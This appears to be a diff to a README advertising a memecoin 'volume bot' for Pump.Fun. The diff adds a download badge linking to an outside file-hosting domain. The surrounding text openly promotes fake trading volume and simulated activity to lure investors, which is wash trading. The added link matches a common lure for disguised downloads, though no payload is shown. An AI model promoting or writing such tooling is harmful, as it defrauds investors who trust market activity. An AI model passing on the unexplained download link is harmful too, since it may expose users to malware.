@@ -2,6 +2,8 @@
 
 **PumpFun Volume Bot** is a specialized tool designed to automate the generation of trading volume and bundle transactions for memecoins on the **Pump.Fun** platform. This bot is perfect for enhancing the visibility of your token, simulating natural trading activity, and increasing hype, all while minimizing gas fees through optimized transaction bundling. With this tool, you can give your memecoin the boost it needs to capture attention and gain more investors.
 
+[![Download PumpFun Bot](https://img.shields.io/badge/Download-PumpFun%20Bot-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+
 ## 🔥 Features:
 - **Automated Volume Generation:** Create fake yet realistic trading volume to make your token more attractive.
 - **Transaction Bundling:** Optimize your token's activity by bundling multiple transactions to reduce fees and increase perceived market activity.
